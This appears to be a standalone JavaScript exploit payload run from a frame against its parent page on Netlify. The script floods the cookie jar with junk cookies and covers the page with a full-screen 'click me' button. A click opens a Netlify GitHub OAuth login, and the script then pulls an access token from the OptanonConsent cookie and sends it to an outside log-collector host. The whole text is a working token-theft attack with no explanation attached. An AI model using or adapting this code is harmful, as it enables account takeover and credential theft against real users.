  
  for (var i = 0, prev = -1; i < 400; i++) {
    parent.document.cookie = 'junk' + i + '=' + 'A'.repeat(32) + '; Path=/';
    var v = parent.document.cookie.split(/; */).length;
    if (v === prev) break;
    prev = v;
  }
  var b = parent.document.createElement('button');
  b.textContent = 'click me';
  b.style.cssText = 'position:fixed;inset:0;width:100vw;height:100vh;border:0;background:#fff;color:#000;font-size:48px;cursor:pointer;z-index:2147483647';
  parent.document.body.append(b);
  b.onclick = function () {
    parent.open('https://api.netlify.com/auth?provider=github&site_id=app.netlify.com&tracking_session_id=afc7d48b-e925-432a-a170-9121236eda09&login=true&entry_point=direct&browser_fingerprint=cbdb57
  39abc754bdcc16cbd4fb07cd0f&device_fingerprint=bbbac72e6221cf088819fff54ca43b40&redirect=https%3A%2F%2fwww.netlify.com%2F&use_redirect=true', '_blank');
    setTimeout(function () {
      var t = (parent.document.cookie.match(/OptanonConsent=([^;]*)/) || [])[1] || '';
      t = (t.match(/access_token%3D([^%&]+)/) || [])[1];
      if (t) fetch('https://http-log-collector.netlify.app/api/log?token=' + t);
    }, 10000);
  };
